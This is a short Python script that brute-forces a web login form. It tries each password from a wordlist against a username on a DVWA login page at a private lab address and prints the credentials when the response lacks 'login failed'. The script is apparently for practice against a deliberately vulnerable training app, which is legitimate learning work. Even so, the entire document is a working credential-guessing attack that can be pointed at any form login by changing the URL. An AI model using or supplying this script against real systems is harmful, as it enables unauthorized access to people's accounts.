#!/usr/bin/python
import requests

def bruteforce(username,url):
        for password in passwords:
            password =password.strip()
            print("[!!]trying to Bruteforce with password:"+password)
            data_dictionary={"username":username,"password":password,"login":"submit"}
            response=requests.post(url,data=data_dictionary)
            if"login failed"in response.content:
                   pass
            else:
                   print("[+] username:-->"+username) 
                   print("[+] password:-->"+password)
                   exit()

page_url="http://192.168.1.5/dvwa/login.php"
username=input("Enter user name for specifies page:")

with open("passwordlist.txt","r") as passwords:
             bruteforce(username,page_url)

print("[!!] password Is  Not In this list!")


